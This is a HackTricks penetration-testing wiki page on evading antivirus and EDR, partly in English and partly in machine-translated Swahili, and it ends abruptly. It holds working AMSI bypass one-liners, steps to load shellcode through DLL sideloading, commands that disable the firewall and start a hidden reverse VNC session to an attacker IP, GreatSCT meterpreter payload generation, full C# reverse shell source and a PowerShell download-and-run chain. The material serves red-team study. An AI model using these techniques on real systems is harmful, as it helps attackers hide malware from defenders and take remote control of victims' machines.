# Antivirus (AV) Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

**This page was written by** [**@m2rc\_p**](https://twitter.com/m2rc_p)**!**

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

* **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

* **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

* **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

{% hint style="info" %}
A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
{% endhint %}

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

* **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
* **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
* **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

{% hint style="info" %}
When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.
{% endhint %}

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze programu zinazoweza kuathiriwa na DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya siri sana ikiwa itafanywa vizuri, lakini ukitumia programu zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.

Kuweka tu DLL mbaya yenye jina ambalo programu inatarajia kupakia, haitapakia mzigo wako, kwani programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo, ili kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inasambaza simu ambazo programu inafanya kutoka kwa proxy (na mbaya) DLL hadi DLL asilia, hivyo kuhifadhi kazi ya programu na kuwa na uwezo wa kushughulikia utekelezaji wa mzigo wako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Amri ya mwisho itatupa faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Hizi ndizo matokeo:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Msimbo wetu wa shell (uliokodishwa na [SGN](https://github.com/EgeBalci/sgn)) na DLL ya proxy wana kiwango cha Ugunduzi wa 0/26 katika [antiscan.me](https://antiscan.me)! Ningesema hiyo ni mafanikio.

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ninapendekeza **sana** uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili kujifunza zaidi kuhusu kile tulichozungumzia kwa undani zaidi.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya payload kwa ajili ya kupita EDRs kwa kutumia michakato iliyositishwa, syscalls za moja kwa moja, na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza msimbo wako wa shell kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kuepuka ni mchezo wa paka na panya, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja tu, ikiwa inawezekana, jaribu kuunganisha mbinu kadhaa za kuepuka.
{% endhint %}

## AMSI (Msingi wa Skanning ya Anti-Malware)

AMSI ilianzishwa ili kuzuia "[malware isiyo na faili](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AV zilikuwa na uwezo wa kuskan **faili kwenye diski**, hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja kwenye kumbukumbu**, AV haingeweza kufanya chochote kuzuia hilo, kwani haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.

* Udhibiti wa Akaunti ya Mtumiaji, au UAC (kuinua EXE, COM, MSI, au usakinishaji wa ActiveX)
* PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya msimbo wa dynamic)
* Windows Script Host (wscript.exe na cscript.exe)
* JavaScript na VBScript
* Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia ya script kwa kufichua maudhui ya script katika mfumo ambao haujaandikwa kwa siri na haujaeleweka.

Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha arifa ifuatayo kwenye Windows Defender.

<figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

Tazama jinsi inavyopachika `amsi:` na kisha njia ya executable ambayo script ilikimbia, katika kesi hii, powershell.exe

Hatukuacha faili yoyote kwenye diski, lakini bado tulikamatwa kwenye kumbukumbu kwa sababu ya AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

* **Obfuscation**

Kwa kuwa AMSI inafanya kazi hasa na kugundua kwa statiki, hivyo, kubadilisha scripts unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka kugunduliwa.

Hata hivyo, AMSI ina uwezo wa kufichua scripts hata ikiwa ina tabaka kadhaa, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi inavyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, unachohitaji kufanya ni kubadilisha majina kadhaa ya mabadiliko na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimewekwa alama.

* **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, nk), inawezekana kuingilia kati kwa urahisi hata ukiendesha kama mtumiaji asiye na mamlaka. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kuepuka skanning ya AMSI.

**Kulazimisha Kosa**

Kulazimisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hakuna skanning itakayofanywa kwa mchakato wa sasa. Awali hii ilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi makubwa. 

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Ilichukua mstari mmoja tu wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu umewekwa alama na AMSI yenyewe, hivyo mabadiliko fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyobadilishwa niliyopata kutoka kwa [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Teknolojia hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayohusika na kusafisha ingizo lililotolewa na mtumiaji) na kuandika tena na maagizo ya kurudisha msimbo wa E\_INVALIDARG, kwa njia hii, matokeo ya uchunguzi halisi yatarudisha 0, ambayo inatafsiriwa kama matokeo safi.

{% hint style="info" %}
Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.
{% endhint %}

Kuna pia mbinu nyingi nyingine zinazotumika kupita AMSI kwa kutumia powershell, angalia [**ukurasa huu**](basic-powershell-for-pentesters/#amsi-bypass) na [repo hii](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.

Au skripti hii ambayo kupitia urekebishaji wa kumbukumbu itarekebisha kila Powersh mpya

## Obfuscation

Kuna zana kadhaa ambazo zinaweza kutumika ku **obfuscate C# clear-text code**, kuunda **metaprogramming templates** za kukusanya binaries au **obfuscate compiled binaries** kama vile:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa toleo la chanzo wazi la [LLVM](http://www.llvm.org/) suite ya kukusanya inayoweza kutoa usalama wa programu ulioimarishwa kupitia [code obfuscation](http://en.wikipedia.org/wiki/Obfuscation_\(software\)) na kuzuia mabadiliko.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa kukusanya, msimbo uliofichwa bila kutumia zana yoyote ya nje na bila kubadilisha mkusanyiko.
* [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya operesheni zilizofichwa zinazozalishwa na mfumo wa metaprogramming wa C++ template ambao utaifanya maisha ya mtu anayetaka kuvunja programu kuwa magumu kidogo.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni obfuscator wa binary x64 ambaye anaweza kuficha aina mbalimbali za faili za pe ikiwa ni pamoja na: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya msimbo wa metamorphic kwa executable zisizo na mipaka.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa kuficha msimbo kwa undani kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (programming oriented return). ROPfuscator inaficha programu katika kiwango cha msimbo wa mkusanyiko kwa kubadilisha maagizo ya kawaida kuwa minyororo ya ROP, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti wa kawaida.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor anaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuziingiza

## SmartScreen & MoTW

Huenda umeshuhudia skrini hii unaposhusha baadhi ya executable kutoka mtandao na kuzitekeleza.

Microsoft Defender SmartScreen ni mekanismu ya usalama iliyokusudiwa kulinda mtumiaji wa mwisho dhidi ya kuendesha programu zinazoweza kuwa na madhara.

<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi hasa kwa njia ya msingi wa sifa, ikimaanisha kwamba programu zisizokuwa za kawaida zitazindua SmartScreen na hivyo kuonya na kuzuia mtumiaji wa mwisho kutekeleza faili hiyo (ingawa faili hiyo bado inaweza kutekelezwa kwa kubofya Taarifa Zaidi -> Endesha hata hivyo).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_\(ADS\)) yenye jina la Zone.Identifier ambayo huundwa kiotomatiki wakati wa kushusha faili kutoka mtandao, pamoja na URL ambayo ilishushwa kutoka.

<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyoshushwa kutoka mtandao.</p></figcaption></figure>

{% hint style="info" %}
Ni muhimu kutambua kwamba executable zilizosainiwa na cheti cha **kuaminika** **hazitazindua SmartScreen**.
{% endhint %}

Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kwa kuzifunga ndani ya aina fulani ya kontena kama ISO. Hii inatokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa **volumes zisizo za NTFS**.

<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayofunga payloads katika kontena za matokeo ili kuepuka Mark-of-the-Web.

Mfano wa matumizi:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Kupakia binaries za C# kwenye kumbukumbu kumekuwa kujulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za baada ya unyakuzi bila kukamatwa na AV.

Kwa kuwa payload itapakuliwa moja kwa moja kwenye kumbukumbu bila kugusa diski, tutahitaji tu kuwa na wasiwasi kuhusu kurekebisha AMSI kwa mchakato mzima.

Mifumo mingi ya C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, nk.) tayari inatoa uwezo wa kutekeleza makusanyo ya C# moja kwa moja kwenye kumbukumbu, lakini kuna njia tofauti za kufanya hivyo:

* **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa dhabihu**, ingiza msimbo wako mbaya wa baada ya unyakuzi kwenye mchakato huo mpya, tekeleza msimbo wako mbaya na unapokamilisha, uue mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork na run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii ina maana kwamba ikiwa kitu katika hatua zetu za baada ya unyakuzi kitatokea vibaya au kukamatwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kukamatwa na **Mikakati ya Tabia**.

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Inahusisha kuingiza msimbo wako mbaya wa baada ya unyakuzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupitisha kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kuanguka.

<figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kutoa mashine iliyovunjwa ufikiaji **wa mazingira ya tafsiri yaliyojinstalled kwenye SMB share inayodhibitiwa na Mshambuliaji**.

Kwa kuruhusu ufikiaji wa Binaries za Mfasiri na mazingira kwenye SMB share unaweza **kutekeleza msimbo wowote katika lugha hizi ndani ya kumbukumbu** ya mashine iliyovunjwa.

Repo inaonyesha: Defender bado inachunguza skripti lakini kwa kutumia Go, Java, PHP nk tuna **uwezo zaidi wa kupita saini za statiki**. Kujaribu na skripti za shell za nyuma zisizo na ufichuzi katika lugha hizi kumethibitishwa kuwa na mafanikio.

## Advanced Evasion

Kuepuka ni mada ngumu sana, wakati mwingine unahitaji kuzingatia vyanzo vingi tofauti vya telemetry katika mfumo mmoja, hivyo ni karibu haiwezekani kubaki bila kugundulika kabisa katika mazingira yaliyoendelea.

Kila mazingira unayokabiliana nayo yatakuwa na nguvu na udhaifu wake.

Ninawashauri sana uangalie hotuba hii kutoka [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu za Kuepuka za Juu.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Hii pia ni hotuba nyingine nzuri kutoka [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Kuepuka kwa Kina.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo it **ondoa sehemu za binary** hadi **ipate sehemu ambayo Defender** inapata kama mbaya na kuigawanya kwako.\
Zana nyingine inayofanya **kitu sawa ni** [**avred**](https://github.com/dobin/avred) ikiwa na huduma ya wavuti wazi inatoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **seva ya Telnet** ambayo unaweza kufunga (kama msimamizi) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya iwe **anzishwe** wakati mfumo unapoanzishwa na **ikimbie** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha bandari ya telnet** (stealth) na kuzima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka upakuaji wa bin, si usanidi)

**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na uweke server:

* Wezesha chaguo _Disable TrayIcon_
* Weka nenosiri katika _VNC Password_
* Weka nenosiri katika _View-Only Password_

Kisha, hamasisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **mhasiriwa**

#### **Muunganisho wa kurudi**

**Mshambuliaji** anapaswa **kutekeleza ndani** ya **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata **muunganisho wa VNC** wa kurudi. Kisha, ndani ya **mhasiriwa**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri huwezi kufanya mambo machache

* Usianze `winvnc` ikiwa tayari inaendesha au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
* Usianze `winvnc` bila `UltraVNC.ini` katika saraka sawa au itasababisha [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) kufunguka
* Usikimbie `winvnc -h` kwa msaada au utaanzisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** na `msfconsole -r file.rc` na **tekeleza** **xml payload** na:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atamaliza mchakato haraka sana.**

### Kuunda shell yetu ya nyuma

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Shell ya Kwanza ya C#

Ili kuunda, tumia:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kutumia kompyuta
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
